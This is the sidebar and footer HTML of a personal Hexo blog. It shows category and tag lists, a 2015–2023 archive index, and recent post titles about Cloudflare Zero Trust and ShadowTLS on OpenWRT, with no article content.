class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/05/25/lede-shadowtls/index/">在LEDE/OpenWRT上使用ShadowTLS</a>
          </li>
        
          <li>
            <a href="/2023/05/01/zero-trust-private-dns/index/">Cloudflare Zero Trust 添加私有解析DNS</a>
          </li>
        
          <li>
            <a href="/2023/04/29/cloudflare-access-gfwed-server/index/">使用Cloudflare Zero Trust连接被墙的服务器</a>
          </li>
        
          <li>
            <a href="/2023/04/22/zero-trust-login-method/index/">Cloudflare Zero Trust App Launcher、Access Group及添加新的登录验证方式</a>
          </li>
        
          <li>
            <a href="/2023/04/20/zero-trust-access-web/index/">使用Cloudflare Zero Trust保护你的Web应用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 Benny小土豆<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>